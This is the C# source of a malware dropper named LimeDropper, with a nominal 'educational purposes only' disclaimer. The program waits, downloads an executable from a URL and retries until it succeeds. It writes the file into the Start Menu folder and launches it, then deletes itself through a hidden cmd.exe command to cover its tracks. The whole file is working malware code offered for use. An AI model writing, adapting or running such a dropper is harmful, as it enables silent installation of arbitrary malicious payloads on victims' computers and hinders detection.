using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : LimeDropper v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace Lime_Dropper_1
{
    class Program
    {
        static void Main()
        {
            Thread.Sleep(2500);
            byte[] Payload = DownloadPayload("http://127.0.0.1/Payload.exe");
            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\Paylad.exe", Payload))
            {
                Melt();
            }
        }

        private static byte[] DownloadPayload(string url)
        {
        re:
            try
            {
                using (WebClient wc = new WebClient())
                {
                    return wc.DownloadData(url);
                }
            }
            catch
            {
                Thread.Sleep(5000);
                goto re;
            }
        }


        private static bool InstallPayload(string dropPath, byte[] payloadBuffer)
        {
            if (!Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
            {
                FileStream FS = null;
                try
                {
                    if (!File.Exists(dropPath))
                        FS = new FileStream(dropPath, FileMode.CreateNew);
                    else
                        FS = new FileStream(dropPath, FileMode.Create);
                    FS.Write(payloadBuffer, 0, payloadBuffer.Length);
                    FS.Dispose();
                    Process.Start(dropPath);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
            return false;
        }


        private static void Melt()
        {
            ProcessStartInfo Del = null;
            try
            {
                Del = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };
            }
            catch { }
            finally
            {
                Process.Start(Del);
                Environment.Exit(0);
            }
        }
    }

}
